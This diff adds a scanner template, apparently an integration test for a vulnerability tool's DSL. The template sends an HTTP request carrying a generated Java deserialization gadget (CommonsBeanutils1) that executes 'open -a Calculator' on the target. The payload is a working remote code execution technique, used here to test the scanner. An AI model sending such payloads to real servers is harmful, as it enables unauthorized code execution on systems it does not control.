@@ -1,0 +1,16 @@
+id: test-dsl-deseriialization
+
+info:
+  name: RAW Template with DSL Deserialization
+  author: gongjl
+  severity: info
+
+http:
+  - raw:
+      # Note for the integration test: dsl expression should not contain commas
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        data={{generate_java_gadget("CommonsBeanutils1_183", "open -a Calculator", "base64")}}
